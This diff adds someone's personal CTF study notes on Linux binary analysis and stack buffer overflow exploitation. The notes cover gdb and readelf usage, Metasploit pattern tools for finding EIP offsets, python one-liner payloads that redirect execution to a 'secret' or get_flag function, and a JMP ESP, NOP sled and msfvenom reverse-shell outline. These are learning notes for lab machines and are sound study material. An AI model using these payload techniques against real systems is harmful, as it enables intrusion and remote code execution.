@@ -1,0 +1,105 @@
+# Tools
+readelf => to read elf files, their functions and addresses
+    readelf -s binary_name  => display function , strigns and symbols , also list out them
+    readelf -s binary_name | grep -i "FUNC"  => display all functions along with their address
+    
+dmesg => 
+   give recent error occurs in functions 
+   
+   dmesg | tail
+   
+   we can check what causes segmentation fault with this
+gdb => gdb allows for step-by-step execution of a program
+
+
+# Knowledge 
+ Executable Linkable format (ELF)
+ 
+ ELF 64 bit -> 64 bit executable
+ 
+ not stripped -> refers to teh presence of debug symbols
+ 
+ command : readelf -h file_name                    # to read the headers of file
+ 
+  running .asm (assembly) files => 
+  
+  gdb -n file_name               # to enter into gbd shell with file
+           == >> gdb commands ( inside gdb shell)
+           
+           disas main                     ## disassembles main / it disassambles the void or int main {} portion of file
+           set disassembly-flavor intel    ## this will set the assembly syntex to intel from atnt ( more understandable , push , mov , ebx type )
+            
+             ----------------- we start from above two commands always , and below are operation commands , which we use do to dynamic analysis of program ---------
+           The breakpoint instruction in hex is "0xcc"
+           r            ## to run the program after setting operations 
+           b main       ## sets a breakpoint at first instruction of main 
+           b *address   ## sets a breakpoint at address
+           ni           ## execute the very next instruction and stop
+           c            ## continue until next breakpoint or end of program is no breakpoint is set
+           i r          ## info registers , it will show current state of registers , you can use this in the mid , start or end of program
+           p $register  ## prints out the value in the register
+           x/NFU        ## N - number , F - format , U - Unit ; examples to print the string stored at ebx-0x2c => set breakpoint at that address , and then x/s $ebx-0x2c => will print the value 
+           info functions  ## list out all functions name present in the binary
+           stepi        ## print the current address , where we are in program
+           
+################# Jumping from one program to other with the help of buffer overflow #################################
+
+
+**********************************************Buffer overflow command pattern*****************************************************
+creating pattern
+        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
+checking the EIP address after segfault
+        dmesg | tail
+checking the buffer size need to overwrite the EIP with EIP value got from dmesg | tail
+        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386F4337
+getting address of secret function
+        objdump -d binary_name
+final payload  (say size of buffer required to overwrite EIP is n and address of secret function is 0xdeadbeaf)
+      python -c "print 'A'*n + '\xef\xbe\xad\xde'"
+      
+      and final execution =>
+       say secret function is giving os command /bin/bash , then we need to keep shell too, for that we can create pwn script or use simple single linear bash command
+       ( python -c "print 'A'*n + 
+        
+        NOTE***************** => some times if we are not able to overwrite, in that case we may able to overwrite some other registers like rdx, rbx etc
+        suppose after taking input at any point ,  call rdx is there , we can see it on disass main, then what we can do , we can make binary to call rdx , and we can write our function code to rdx
+    
+**********************************************Buffer overflow command pattern*****************************************************
+
+
+
+    i) RCE via Buffer overflow => (https://infosecwriteups.com/exploiting-a-windows-based-buffer-overflow-e4d1b6f6d5fb  , thm machines : brainpan 1)
+                     step 1) => find the parameter vulnerable for buffer overflow 
+                     step 2) => find after how many characters we can overwrite ( or can change) the value of EIP register (the register which contain the address of next instruction)
+                     step 3) => we need to find the address of JMP ESP instruction within the binary/executable , it will be same in every function, 
+                     step 4) => using buffer overflow we need to overwrite the EIP register value to JMP ESP instruction address, so the next instruction will be JMP ESP and it will jump to the top of stack
+                     step 5) => to put our shell / rce / revershell code at the top of stack we need to send '\x90\*n (where n is big number ,like 50,100,1000 etc) to give padding + our_reverse_shell_code
+                     
+                     *** So overall payload will be => number_of_char_before_EIP + "address of JMP ESP instrunction , use immunity debbuger to find it for exe ,and for linux excutables use GDB" + "\x90"*100 (padding) + "reverse shell code, use msfvenom to produce it"
+         
+         
+         ********************************************************getting required buffer size using metasploit exploit*********************************************************
+         First we need to create a known pattern (known means metasploit known it)
+          ==>>  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
+         now say: dmseg | tail => says  segfalut occur at EIP 386F4337
+         
+         then search the number of char required to overwrite EIP by using below command: 
+         
+         =>>  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386F4337
+
+        suppose , a binrary taking user input , using gets function , then we know its vulnerable for buffer overflow :
+       1)  so our first step to find after how many charaters we are getting segmentation flaut , 
+        
+        for that put the big strings like 'A'*64 or 'A'*100 , and try to get exact number 
+        
+        ------ say on putting 83 char long strings , everyting is fine , but as we put 84 char long string , we get segmentation fault , 
+        so the buffer flow occur after 83 char
+        
+      2) our second step is to find the address of the function we want to run, say we want to run function whose name is get_falg() , so for running it after putting user input, 
+      for that give command : objdump -d file_name | grep get_flag
+      then check the address of the function , convert it into byte , also make sure that you know which type of storing is there , little endian or big endian 
+        => one liner command to check little or big endian => python3 -c "from sys import byteorder;print(byteorder)"
+        suppose address we got is 000000456789 and macine is little endian , then break address in two two bytes => then wrote them in reverse order and add \x to convert in bytes =>
+          \x89\x67\x45\x00\x00\x00  , sometimes function address does'nt work , in  that case take the address of first instruction of that function
+          now our payload can be => python3 -c "print('A'*82 + '\x89\x67\x45\x00\x00\x00')
+      
